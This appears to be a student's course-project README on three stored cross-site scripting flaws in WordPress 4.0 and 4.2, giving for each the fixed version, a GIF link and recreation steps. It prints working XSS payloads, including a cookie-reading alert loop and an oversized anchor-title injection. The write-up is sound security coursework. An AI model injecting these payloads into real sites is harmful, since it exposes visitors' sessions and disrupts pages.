# Week-7-Project
WordPress vs. Kali
> Objective: Find, analyze, recreate, and document **three vulnerabilities** affecting an old version of WordPress

1.) WordPress version 4.2 : Unauthenticated XSS (Cross Site Scripting)
- [ ] Summary:
   - Type of vulnerability: Cross Site Scripting
   - Fixed in version 4.2.1
   - Tested in version 4.2
- [ ] GIF Walkthrough:![](https://i.imgur.com/9udE06b.gif)
- [ ] Steps to recreate: Use the following to comment on a WordPress Post: 
<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px <insert 64k of random data
- [ ] Affected source code: N/A


2.) WordPress version 4.0 : Unauthenticated XSS (Cross Site Scripting)
- [ ] Summary:
   - Type of vulnerability: Cross Site Scripting
   - Fixed in version 4.2
   -Tested in version 4.0
- [ ] GIF Walkthrough:![](https://i.imgur.com/apmXNl5.gif)
- [ ] Steps to recreate: Post the following in the comments of a post: <script>while(1){alert(document.cookie);}<script>
- [ ] Affected source code: N/A
   
   
3.) WordPress version 4.0 : Unauthenticated XSS (Cross Site Scripting)
- [ ] Summary:
   - Type of vulnerability: Cross Site Scripting
   - Fixed in version 4.7.3
   - Tested in version 4.0
   - [ ] GIF Walkthrough:![](https://i.imgur.com/OQiuZdm.gif)
   - [ ] Steps to recreate: Create media post, add "filename <script>alert("XSS");</script>" to description, then click view attachment page.
   - [ ] Affected source code: N/A
   
   ## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright 2018 Martin Rocha

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
